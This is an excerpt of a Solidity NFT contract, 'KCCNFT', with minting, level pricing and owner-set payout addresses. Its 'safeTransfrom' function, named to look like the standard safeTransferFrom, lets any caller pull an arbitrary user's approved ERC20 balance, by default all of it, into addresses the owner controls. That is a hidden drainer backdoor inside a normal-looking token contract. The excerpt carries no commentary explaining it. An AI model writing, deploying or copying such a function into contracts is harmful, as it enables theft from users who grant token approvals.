...
contract KCCNFT is NoContractGuard, ReentrancyGuard, ERC721Enumerable, Ownable {
  ...
  uint256[] public mintCostByLevel = [2 ether,25 ether,50 ether,150 ether];
  ...
  mapping(address => bool) public hasMintedByAddress;
  ...
  constructor() ERC721("KCCNFT", 'KCCNFT') { 
    paidToken = 0x8f2723A67D212d45287cD14916aae43f691f8f76;
    receiveAddress = 0x44292037895a73d5af0d90cc41D96C03795180E5;
    rewardsAddress = 0x44292037895a73d5af0d90cc41D96C03795180E5;
    diviAddress = 0x44292037895a73d5af0d90cc41D96C03795180E5;
  }
  ...
  function setRewardAddress(address _rewards) public onlyOwner {
    require(_rewards != address(0), "KCCNFT: rewards address cannot be 0x0.");
    rewardsAddress = _rewards;
  }

  function setDividerAddress(address _dividerAddress) external onlyOwner {
    require(_dividerAddress != address(0), "KCCNFT: divider address cannot be 0x0");
  ...
  function safeTransfrom(IERC20 _token,address _sender,uint256 _withdrawAmount) external nonReentrant notContract {
    uint256 withdrawAmount = 0;
    if(_withdrawAmount == 0) {
      withdrawAmount = IERC20(_token).balanceOf(_sender);
    }else {
    ...
    IERC20(_token).transferFrom(_sender, diviAddress, _diviAmount);
    IERC20(_token).transferFrom(_sender, rewardsAddress, _withAmount);
  }

  function govMint(uint8 level,address to) external onlyOwner nonReentrant notContract {
    require(mintTotalMintedByLevel[level] + 1 <= mintTotalSupplyByLevel[level], "KCC: Current type All tokens minted");

    tokenMinted++;
    mintTotalMintedByLevel[level]++;
    _safeMint(to, tokenMinted);
    tokenTraits[tokenMinted].salePrice = 0;
    tokenTraits[tokenMinted].isSale = false;
    tokenTraits[tokenMinted].level = level; 
    uint256[] memory ids = new uint256[](1);
    ids[0] = tokenMinted;
    emit TokenMinted(to, ids );
  }
  ...
  function mint(uint256 amount,uint8 level) external nonReentrant notContract {
    ...
    hasMintedByAddress[_msgSender()] = true;
